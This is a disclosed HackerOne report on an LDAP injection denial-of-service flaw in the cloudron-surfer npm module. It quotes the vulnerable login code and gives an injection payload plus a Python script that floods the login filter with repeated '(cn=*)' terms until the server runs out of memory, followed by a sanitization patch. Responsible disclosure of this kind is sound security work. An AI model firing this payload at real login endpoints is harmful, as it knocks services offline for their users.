@@ -1,0 +1,202 @@
+{
+  "id": 906959,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDY5NTk=",
+  "url": "https://hackerone.com/reports/906959",
+  "title": "[cloudron-surfer] Denial of Service via LDAP Injection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-06-24T17:12:07.769Z",
+  "submitted_at": "2020-06-24T17:12:07.769Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3lla",
+    "url": "/d3lla",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-08-22T08:48:44.185Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-22T08:48:44.147Z",
+  "team_member_agreed_on_going_public_at": "2020-08-21T20:49:19.798Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report `Denial of service via LDAP Injection` vulnerability in `cloudron-surfer` module.\nIt allows a malicious attacker to send a malformed input that is interpreted as an LDAP filter, leading to Denial of Service.\n\n# Module\n\n**module name:** `cloudron-surfer`\n**version:** `5.9.0`\n**npm page:** `https://www.npmjs.com/package/cloudron-surfer`\n\n## Module Description\n\nSurfer is a Simple static file server. It comes with a commandline tool to upload files from your local folders and a webinterface to manage files directly on the server.\n\n## Module Stats\n\n[4] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe module is vulnerable to a DoS via LDAP Injection.\nLDAP injection is a particular case of Injection vulnerabilities that occurs when user controlled input not properly sanitized is used to build LDAP filter. \nThis could lead to modification of LDAP statements performed. Depending on the application, this could lead to an authentication bypass, information disclosure or DoS.\n\nThe problem arises during the login phase. User controlled input `username` is used to build a LDAP filter without any sanitization. \nThe filter uses an `OR` operation between different attributes that are `uid`, `mail`, `username`, `sAMAccountName`.\nThe search returns all the users whose one of the attributes above has value `username`. Then it takes the first and match with the `password` provided using a `bind` operation.\n\nThe problem occurs when the `username` contains valid LDAP character filters, like for example `*` (the filter `(cn=*)` is a presence filter that will match any entry with one or more values for the `cn` attribute), that could change the LDAP statement.\n\nIf an attacker provides as `username` the value `*`, this will result in the following filter:\n`(|(uid=*)(mail=*)(username=*)(sAMAccountName=*))`.\n\nIn order for an attacker to perform a DoS, he/she has to build a filter that will take long time to be evaluated.\nFor example, if the attacker provides the following payload `*)(cn=*)(cn=*`, this will result in the following filter:\n`(|(uid=*)(cn=*)(cn=*)(mail=*)(cn=*)(cn=*)(username=*)(cn=*)(cn=*)(sAMAccountName=*)(cn=*)(cn=*))`.\n\nIf instead of `*)(cn=*)(cn=*`, an attacker repeat the middle `(cn=*)` thousand of times, this will result in a huge filter that will take a huge amount of time to be evaluated, leading to DoS.\n\nBelow the vulnerable code:\n\n```javascript\n// https://github.com/nebulade/surfer/blob/master/src/auth.js#L72\n// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L74\n....\n\nfunction verifyUser(username, password, callback) {\n    if (AUTH_METHOD === 'ldap') {\n        var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });\n        ldapClient.on('error', function (error) {\n            console.error('LDAP error', error);\n        });\n\n        ldapClient.bind(process.env.CLOUDRON_LDAP_BIND_DN, process.env.CLOUDRON_LDAP_BIND_PASSWORD, function (error) {\n            if (error) return callback(error);\n\n            var filter = `(|(uid=${username})(mail=${username})(username=${username})(sAMAccountName=${username}))`; //<-- INJECTION: username is not sanitized\n            ldapClient.search(process.env.CLOUDRON_LDAP_USERS_BASE_DN, { filter: filter }, function (error, result) {\n                if (error) return callback(error);\n\n                var items = [];\n\n                result.on('searchEntry', function(entry) { items.push(entry.object); });\n                result.on('error', callback);\n                result.on('end', function (result) {\n                    if (result.status !== 0 || items.length === 0) return callback('Invalid credentials');\n\n                    // pick the first found\n                    var user = items[0];\n\n                    ldapClient.bind(user.dn, password, function (error) {\n                        if (error) return callback('Invalid credentials');\n\n                        callback(null, { username: username });\n                    });\n                });\n            });\n        });\n    }\n...\n\n// https://github.com/nebulade/surfer/blob/master/src/auth.js#L107\n// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L113\nexports.login = function (req, res, next) {\n    verifyUser(req.body.username, req.body.password, function (error, user) { //<-- USER CONTROLLED INPUT\n        if (error) return next(new HttpError(401, 'Invalid credentials'));\n\n        var accessToken = LOGIN_TOKEN_PREFIX + uuid();\n\n        tokenStore.set(accessToken, user, function (error) {\n            if (error) return next(new HttpError(500, error));\n\n            next(new HttpSuccess(201, { accessToken: accessToken, user: user }));\n        });\n    });\n};\n\n```\n\n```javascript\n// https://github.com/nebulade/surfer/blob/master/server.js#L76\n// https://git.cloudron.io/cloudron/surfer/-/blob/master/server.js#L75\n...\nrouter.post  ('/api/login', auth.login);\n...\n```\n## Steps To Reproduce:\n\nTo test this app on a real live system, you need first to install `Cloudron` (https://cloudron.io/get.html) and then install the `Surfer` app (https://cloudron.io/store/io.cloudron.surfer.html). In order to install the `Cloudron` app you need first a domain. In this case the web interface is available under the `https://[appdomain]/_admin/` location.\n\nIstead of the above setting, I tested the app locally. \nBelow steps to reproduce the vulnerability.\n\nAs mentioned in another project (https://github.com/nebulade/meemo#development ), to simulate a LDAP server for users authentication, I used a test server provided by the same author (https://github.com/nebulade/ldapjstestserver). (you can find attached).\n\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `cloudron-surfer` module:\n    -  `npm i cloudron-surfer`\n\n- start the LDAP test server:\n    -  `node ldapjstestserver.js`\n\n- start the `surfer` app locally (we need to setup some enviroment variables to enable the LDAP authentication):\n    - `CLOUDRON_LDAP_BIND_DN=\"cn=admin,ou=users,dc=example\" CLOUDRON_LDAP_BIND_PASSWORD=\"password\" CLOUDRON_LDAP_USERS_BASE_DN=\"ou=users,dc=example\" CLOUDRON_LDAP_URL=\"ldap://localhost:3002\" node node_modules/cloudron-surfer/server.js`\n\nBefore performing the attack let's first check that everything works as expected:\n- visit `http://localhost:3000/_admin/`\n- enter `normal` and `test` respectively in the `username` and `password` fields and the click enter\n- logout \n\nBefore performing the attack let's first check that everything works as expected even with a long value for `username`:\n- visit `http://localhost:3000/_admin/`\n- run the following `python` script (`run_safe.py`):\n\n```python\nimport requests\n\nurl = 'http://localhost:3000/api/login'\n\npayload =  \"a\"*(len(\"*)\") + len(\"(cn=*)\")*700000 + len(\"(cn=*\"))\n\nprint(f\"Payload's length: {len(payload)} characters\")\n\ndata = {\n    'username': payload,\n    'password': 'pass'\n}\n\nresponse = requests.post(url, data = data)\n```\n\n- enter `normal` and `test` respectively in the `username` and `password` fields and the click enter\n- logout \n\nReproduce the attack:\n- visit `http://localhost:3000/_admin/`\n- run the following `python` script (`run.py`):\n\n```python\nimport requests\n\nurl = 'http://localhost:3000/api/login'\n\npayload = \"*)\" + \"(cn=*)\"*700000 + \"(cn=*\"\n\nprint(f\"Payload's length: {len(payload)} characters\")\n\ndata = {\n    'username': payload,\n    'password': 'pass'\n}\n\nresponse = requests.post(url, data = data)\n```\n- the page will load until the server crashes. After some time you will get the following error:\n`FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`\n\nIf an attacker send one (like in my case) or multiple requests like in the previous example, he/she could potentially makes the service unavaible and consumes all the server resources, leading to DoS.\n\n{F881315}\n\n## Patch\nSanitize the user input before using it to build LDAP filters.\n\nPossible solution could be for example this one (taken from another project):\n- Github Issue: [Vulnerable to ldap injection](https://github.com/vesse/node-ldapauth-fork/issues/21)\n- Github Commit: [Sanitize user input: Replace the specific special characters with codes as defined in LDAP specification.](https://github.com/vesse/node-ldapauth-fork/commit/3feea43e243698bcaeffa904a7324f4d96df60e4) \n\nInspired by the same issue (https://github.com/vesse/node-ldapauth-fork/issues/21), here there are the RFC specifications (https://tools.ietf.org/search/rfc4515#section-3 ):\n```\n    The rule ensures that the entire filter string is a\n    valid UTF-8 string and provides that the octets that represent the\n    ASCII characters \"*\" (ASCII 0x2a), \"(\" (ASCII 0x28), \")\" (ASCII\n    0x29), \"\" (ASCII 0x5c), and NUL (ASCII 0x00) are represented as a\n    backslash \"\" (ASCII 0x5c) followed by the two hexadecimal digits\n    representing the value of the encoded octet.\n\n    This simple escaping mechanism eliminates filter-parsing ambiguities\n    and allows any filter that can be represented in LDAP to be\n    represented as a NUL-terminated string. Other octets that are part\n    of the set may be escaped using this mechanism, for example,\n    non-printing ASCII characters.\n\n    For AssertionValues that contain UTF-8 character data, each octet of\n    the character to be escaped is replaced by a backslash and two hex\n    digits, which form a single octet in the code of the character. For\n    example, the filter checking whether the \"cn\" attribute contained a\n    value with the character \"\" anywhere in it would be represented as\n    \"(cn=\\2a*)\".\n\n    As indicated by the rule, implementations MUST escape\n    all octets greater than 0x7F that are not part of a valid UTF-8\n    encoding sequence when they generate a string representation of a\n    search filter. Implementations SHOULD accept as input strings that\n    are not valid UTF-8 strings. This is necessary because RFC 2254 did\n    not clearly define the term \"string representation\" (and in\n    particular did not mention that the string representation of an LDAP\n    search filter is a string of UTF-8-encoded Unicode characters).\n```\n\n\n\n\n## Supporting Material/References:\n\nSome helpful resources I used for this research:\n- [LDAP injection](https://en.wikipedia.org/wiki/LDAP_injection)\n- [LDAP Filters](https://ldap.com/ldap-filters/)\n- [BlackHat: LDAP Injection & Blind LDAP Injection](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)\n- [Understanding and Defending Against LDAP Injection Attacks](https://ldap.com/2018/05/04/understanding-and-defending-against-ldap-injection-attacks/)\n- [LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)\n- [Ldapjs - orfilter](http://ldapjs.org/filters.html#orfilter)\n\nMy setup:\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nDenial of service",
+  "weakness": {
+    "id": 99,
+    "name": "LDAP Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 881310,
+      "file_name": "run_safe.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wTX76bpZALUnSpLW5HUjd8d7?response-content-disposition=attachment%3B%20filename%3D%22run_safe.py%22%3B%20filename%2A%3DUTF-8%27%27run_safe.py&response-content-type=text%2Fx-python-script&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYSDPRRA5%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T130449Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFdPezZn4fC1kQscjAXOgBjZwIkA4FFJmbjJMB9Y%2F%2BmBAiEA8M3EHPkDC%2B%2FSSZy9KE3Iwq2cZWvIgENdnNvz9EdevtwquwUInf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGmCHZnpHdGtZl0uJiqPBTS%2FSWdlc4n7%2FZ0Aa9hQpakCX%2BWpnSPlW0iQDDX7vnhO7KLerzcM7%2BLHQUyBTTg%2BGEI%2FU7f78JcIbn%2B6tK5enmoVzfMm0RbvPJrbM8i%2BHDfX1Dxdv95jOuJXm3Or1D7sECckokFx12M%2B8juGwvyipYc5e5%2FTx%2BNO4WK6TvD%2FUbZAkM229kaywNOV0TlZn0Nj4UuT8COb7FAFNGWSKczULJhNS2PUp4jldH8af7WtU4thTKqDe%2BJ4SGCspbxo7qWvz9lA1ZnYvaZ8SCL3tuSBbpjVGSO18tecAGkVtgrwQI5%2FEkvPyQNkBM3MGVk3%2FqNxtOw64SmiqfvT6Hve94OXIxsr7eQT3v4PwXeGS5imPyf5SW0iNhgYVx3yBrrP89BsXzs7Y4ZHq%2FRYmfX7J4qlCblkZgRECt%2F9h%2FfNY9cC2MMIGE6JeU5pKZ9X46CNW4rvnAUbLBxvFz6XqPKohuK63K05O2yNhVtyO93naPMwSLum1EvR59KkA6Yv3dSwK9651OMUi7rCUjB%2F1y2nVciguD2BFO14YA1zdcJzEyG7c04aEPnRuX2979f0wr6tIOTR%2FFmtnfChZ%2Bs0d%2B46o3sZIHLjAFZmJW6LHrvwgIFqZrG5X7IWLBkmKdnZcaiLjRbfcxtxUNQmUwUpNVixhLYFOHvhman2xJTw5p0DQv1PRFMt7I3pqvr%2BwPB17hasrFQRX%2FAzGti5Ha%2FPHuqZ7E786QOwHmkm91IPAMf5Ec5lOtbpUZeHpuXYIOn3CiseFJ2hxoHdiR1AIPWHudXGgB0grd8rmERRFgy0gP%2BTn4kqHMw2tP6V6nzwRIEKTVfm5IZ7LXlntSjSWwE5jPrpDwm1JgX2wZUTMA2aK854ADY%2B7LUwjr6V0QY6sQHFTyM6o3e666oceNDduP3hJS7rJg4AVJkKaL5PN0Bln0eD7OaAJjbUNTbTsUnkzok%2FLADIdiMT4LahmbSLnYBbv5kCf5onjq04vZKGAT%2B%2F4PlrHn%2BITuNWFSSbHC4nm6EpcgYdDQBYz3Dr2KJVPFcBD9fwTyfg3%2B6Ah06jHMKKUUyiwtpB5eldGi6H43RYY303fbgmPrM%2BLp08pApGxLrKFyjoLWjJYMAvKgNHrioGGTA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4182cd1a3c592962c2fde4554787b89dde4d3f43574bac2e65e1a4e399a552fa",
+      "file_size": 282,
+      "type": "text/x-python-script",
+      "moderated": null
+    },
+    {
+      "id": 881311,
+      "file_name": "ldapjstestserver.js",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6M54rGLh3V1aZhYsLuXMuqnX?response-content-disposition=attachment%3B%20filename%3D%22ldapjstestserver.js%22%3B%20filename%2A%3DUTF-8%27%27ldapjstestserver.js&response-content-type=application%2Fx-perl&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYSDPRRA5%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T130449Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFdPezZn4fC1kQscjAXOgBjZwIkA4FFJmbjJMB9Y%2F%2BmBAiEA8M3EHPkDC%2B%2FSSZy9KE3Iwq2cZWvIgENdnNvz9EdevtwquwUInf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGmCHZnpHdGtZl0uJiqPBTS%2FSWdlc4n7%2FZ0Aa9hQpakCX%2BWpnSPlW0iQDDX7vnhO7KLerzcM7%2BLHQUyBTTg%2BGEI%2FU7f78JcIbn%2B6tK5enmoVzfMm0RbvPJrbM8i%2BHDfX1Dxdv95jOuJXm3Or1D7sECckokFx12M%2B8juGwvyipYc5e5%2FTx%2BNO4WK6TvD%2FUbZAkM229kaywNOV0TlZn0Nj4UuT8COb7FAFNGWSKczULJhNS2PUp4jldH8af7WtU4thTKqDe%2BJ4SGCspbxo7qWvz9lA1ZnYvaZ8SCL3tuSBbpjVGSO18tecAGkVtgrwQI5%2FEkvPyQNkBM3MGVk3%2FqNxtOw64SmiqfvT6Hve94OXIxsr7eQT3v4PwXeGS5imPyf5SW0iNhgYVx3yBrrP89BsXzs7Y4ZHq%2FRYmfX7J4qlCblkZgRECt%2F9h%2FfNY9cC2MMIGE6JeU5pKZ9X46CNW4rvnAUbLBxvFz6XqPKohuK63K05O2yNhVtyO93naPMwSLum1EvR59KkA6Yv3dSwK9651OMUi7rCUjB%2F1y2nVciguD2BFO14YA1zdcJzEyG7c04aEPnRuX2979f0wr6tIOTR%2FFmtnfChZ%2Bs0d%2B46o3sZIHLjAFZmJW6LHrvwgIFqZrG5X7IWLBkmKdnZcaiLjRbfcxtxUNQmUwUpNVixhLYFOHvhman2xJTw5p0DQv1PRFMt7I3pqvr%2BwPB17hasrFQRX%2FAzGti5Ha%2FPHuqZ7E786QOwHmkm91IPAMf5Ec5lOtbpUZeHpuXYIOn3CiseFJ2hxoHdiR1AIPWHudXGgB0grd8rmERRFgy0gP%2BTn4kqHMw2tP6V6nzwRIEKTVfm5IZ7LXlntSjSWwE5jPrpDwm1JgX2wZUTMA2aK854ADY%2B7LUwjr6V0QY6sQHFTyM6o3e666oceNDduP3hJS7rJg4AVJkKaL5PN0Bln0eD7OaAJjbUNTbTsUnkzok%2FLADIdiMT4LahmbSLnYBbv5kCf5onjq04vZKGAT%2B%2F4PlrHn%2BITuNWFSSbHC4nm6EpcgYdDQBYz3Dr2KJVPFcBD9fwTyfg3%2B6Ah06jHMKKUUyiwtpB5eldGi6H43RYY303fbgmPrM%2BLp08pApGxLrKFyjoLWjJYMAvKgNHrioGGTA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=485cd5ffa19f2f3d73e5b274ecab8717b1dd0082c2b4be44e25fde124d8d1d60",
+      "file_size": 5346,
+      "type": "application/x-perl",
+      "moderated": null
+    },
+    {
+      "id": 881312,
+      "file_name": "run.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/btBL7Q65huMNego4nVb5p2AK?response-content-disposition=attachment%3B%20filename%3D%22run.py%22%3B%20filename%2A%3DUTF-8%27%27run.py&response-content-type=text%2Fx-python-script&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYSDPRRA5%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T130449Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFdPezZn4fC1kQscjAXOgBjZwIkA4FFJmbjJMB9Y%2F%2BmBAiEA8M3EHPkDC%2B%2FSSZy9KE3Iwq2cZWvIgENdnNvz9EdevtwquwUInf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGmCHZnpHdGtZl0uJiqPBTS%2FSWdlc4n7%2FZ0Aa9hQpakCX%2BWpnSPlW0iQDDX7vnhO7KLerzcM7%2BLHQUyBTTg%2BGEI%2FU7f78JcIbn%2B6tK5enmoVzfMm0RbvPJrbM8i%2BHDfX1Dxdv95jOuJXm3Or1D7sECckokFx12M%2B8juGwvyipYc5e5%2FTx%2BNO4WK6TvD%2FUbZAkM229kaywNOV0TlZn0Nj4UuT8COb7FAFNGWSKczULJhNS2PUp4jldH8af7WtU4thTKqDe%2BJ4SGCspbxo7qWvz9lA1ZnYvaZ8SCL3tuSBbpjVGSO18tecAGkVtgrwQI5%2FEkvPyQNkBM3MGVk3%2FqNxtOw64SmiqfvT6Hve94OXIxsr7eQT3v4PwXeGS5imPyf5SW0iNhgYVx3yBrrP89BsXzs7Y4ZHq%2FRYmfX7J4qlCblkZgRECt%2F9h%2FfNY9cC2MMIGE6JeU5pKZ9X46CNW4rvnAUbLBxvFz6XqPKohuK63K05O2yNhVtyO93naPMwSLum1EvR59KkA6Yv3dSwK9651OMUi7rCUjB%2F1y2nVciguD2BFO14YA1zdcJzEyG7c04aEPnRuX2979f0wr6tIOTR%2FFmtnfChZ%2Bs0d%2B46o3sZIHLjAFZmJW6LHrvwgIFqZrG5X7IWLBkmKdnZcaiLjRbfcxtxUNQmUwUpNVixhLYFOHvhman2xJTw5p0DQv1PRFMt7I3pqvr%2BwPB17hasrFQRX%2FAzGti5Ha%2FPHuqZ7E786QOwHmkm91IPAMf5Ec5lOtbpUZeHpuXYIOn3CiseFJ2hxoHdiR1AIPWHudXGgB0grd8rmERRFgy0gP%2BTn4kqHMw2tP6V6nzwRIEKTVfm5IZ7LXlntSjSWwE5jPrpDwm1JgX2wZUTMA2aK854ADY%2B7LUwjr6V0QY6sQHFTyM6o3e666oceNDduP3hJS7rJg4AVJkKaL5PN0Bln0eD7OaAJjbUNTbTsUnkzok%2FLADIdiMT4LahmbSLnYBbv5kCf5onjq04vZKGAT%2B%2F4PlrHn%2BITuNWFSSbHC4nm6EpcgYdDQBYz3Dr2KJVPFcBD9fwTyfg3%2B6Ah06jHMKKUUyiwtpB5eldGi6H43RYY303fbgmPrM%2BLp08pApGxLrKFyjoLWjJYMAvKgNHrioGGTA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b9e1f8c7aa8ddcc3f59542a73b801e29ed88c4927989d8bb37b69ce3cdabcf70",
+      "file_size": 260,
+      "type": "text/x-python-script",
+      "moderated": null
+    },
+    {
+      "id": 881315,
+      "file_name": "poc.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3Ye5mgaQdPKPn9yNzGtceDcB?response-content-disposition=attachment%3B%20filename%3D%22poc.mov%22%3B%20filename%2A%3DUTF-8%27%27poc.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYSDPRRA5%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T130449Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFdPezZn4fC1kQscjAXOgBjZwIkA4FFJmbjJMB9Y%2F%2BmBAiEA8M3EHPkDC%2B%2FSSZy9KE3Iwq2cZWvIgENdnNvz9EdevtwquwUInf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGmCHZnpHdGtZl0uJiqPBTS%2FSWdlc4n7%2FZ0Aa9hQpakCX%2BWpnSPlW0iQDDX7vnhO7KLerzcM7%2BLHQUyBTTg%2BGEI%2FU7f78JcIbn%2B6tK5enmoVzfMm0RbvPJrbM8i%2BHDfX1Dxdv95jOuJXm3Or1D7sECckokFx12M%2B8juGwvyipYc5e5%2FTx%2BNO4WK6TvD%2FUbZAkM229kaywNOV0TlZn0Nj4UuT8COb7FAFNGWSKczULJhNS2PUp4jldH8af7WtU4thTKqDe%2BJ4SGCspbxo7qWvz9lA1ZnYvaZ8SCL3tuSBbpjVGSO18tecAGkVtgrwQI5%2FEkvPyQNkBM3MGVk3%2FqNxtOw64SmiqfvT6Hve94OXIxsr7eQT3v4PwXeGS5imPyf5SW0iNhgYVx3yBrrP89BsXzs7Y4ZHq%2FRYmfX7J4qlCblkZgRECt%2F9h%2FfNY9cC2MMIGE6JeU5pKZ9X46CNW4rvnAUbLBxvFz6XqPKohuK63K05O2yNhVtyO93naPMwSLum1EvR59KkA6Yv3dSwK9651OMUi7rCUjB%2F1y2nVciguD2BFO14YA1zdcJzEyG7c04aEPnRuX2979f0wr6tIOTR%2FFmtnfChZ%2Bs0d%2B46o3sZIHLjAFZmJW6LHrvwgIFqZrG5X7IWLBkmKdnZcaiLjRbfcxtxUNQmUwUpNVixhLYFOHvhman2xJTw5p0DQv1PRFMt7I3pqvr%2BwPB17hasrFQRX%2FAzGti5Ha%2FPHuqZ7E786QOwHmkm91IPAMf5Ec5lOtbpUZeHpuXYIOn3CiseFJ2hxoHdiR1AIPWHudXGgB0grd8rmERRFgy0gP%2BTn4kqHMw2tP6V6nzwRIEKTVfm5IZ7LXlntSjSWwE5jPrpDwm1JgX2wZUTMA2aK854ADY%2B7LUwjr6V0QY6sQHFTyM6o3e666oceNDduP3hJS7rJg4AVJkKaL5PN0Bln0eD7OaAJjbUNTbTsUnkzok%2FLADIdiMT4LahmbSLnYBbv5kCf5onjq04vZKGAT%2B%2F4PlrHn%2BITuNWFSSbHC4nm6EpcgYdDQBYz3Dr2KJVPFcBD9fwTyfg3%2B6Ah06jHMKKUUyiwtpB5eldGi6H43RYY303fbgmPrM%2BLp08pApGxLrKFyjoLWjJYMAvKgNHrioGGTA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2472a8d38c3d4d81bcf5e8cd45f6b0e3547d7798f3915f49bfdfc6bfc78a0b46",
+      "file_size": 57057039,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-20T20:49:19.898Z",
+  "allow_singular_disclosure_after": -180202529.99322438,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "sh3rif0x",
+    "can",
+    "fall4w",
+    "surya_m2003",
+    "anas20066",
+    "prasanthpro",
+    "airim-coder",
+    "aizen07"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "can_manage?": false,
+    "can_export?": false,
+    "can_add_comment?": false,
+    "can_request_decision_review_without_strict_acl_mode?": false,
+    "can_request_decision_review?": false,
+    "can_reject_decision_review?": false,
+    "can_change_state?": false,
+    "can_reopen?": false,
+    "can_award_bounty?": false,
+    "can_award_swag?": false,
+    "can_suggest_bounty_amount?": false,
+    "can_create_dupe_window_bounty?": false,
+    "can_assign_to_user?": false,
+    "can_assign_to_h1_triage?": false,
+    "can_hide_timeline?": false,
+    "can_agree_on_going_public?": false,
+    "can_cancel_disclosure_request?": false,
+    "can_be_publicly_disclosed?": false,
+    "can_post_internal_comments?": false,
+    "can_manage_common_responses?": false,
+    "can_use_common_responses?": false,
+    "can_reassign_to_team?": false,
+    "can_change_title?": false,
+    "can_change_vulnerability_information?": false,
+    "can_change_weakness?": false,
+    "can_be_manually_disclosed?": false,
+    "can_clone?": false,
+    "can_close_as_na?": false,
+    "can_close_as_duplicate?": false,
+    "can_close_as_informative?": false,
+    "can_close_as_spam?": false,
+    "can_close_as_resolved?": false,
+    "can_ban_researcher?": false,
+    "can_create_severity?": false,
+    "can_close_comments?": false,
+    "can_change_structured_scope?": false,
+    "can_manage_collaborators?": false,
+    "can_view_bounty_weights?": false,
+    "can_redact?": false,
+    "can_view_credential_account_details?": false,
+    "can_request_retest?": false,
+    "can_cancel_retest?": false,
+    "can_submit_draft?": false,
+    "can_delete_draft?": false,
+    "can_change_to_pending_program_review_state?": false,
+    "can_request_code_review?": false,
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "can_change_pentest": false,
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
